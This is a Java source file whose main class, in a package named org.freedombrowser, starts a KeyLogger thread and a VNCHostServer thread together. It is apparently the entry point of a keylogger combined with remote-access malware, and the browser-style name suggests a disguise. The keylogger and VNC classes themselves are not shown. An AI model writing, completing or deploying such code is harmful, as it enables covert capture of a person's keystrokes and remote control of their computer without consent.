package org.freedombrowser;

public class MainProcess {
    public static void main(String[] args) {
        // Create two threads to run Class1 and Class2 concurrently
        Thread thread1 = new Thread(() -> {
            try {
                KeyLogger.main(args);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        });
        Thread thread2 = new Thread(() -> VNCHostServer.main(args));

        // Start both threads
        System.out.println("[MainProcess] Starting Keylogger thread");
        thread1.start();
        System.out.println("[MainProcess] Starting VNCHostServer thread");
        thread2.start();

        try {
            // Wait for both threads to finish before exiting the main thread
            thread1.join();
            thread2.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}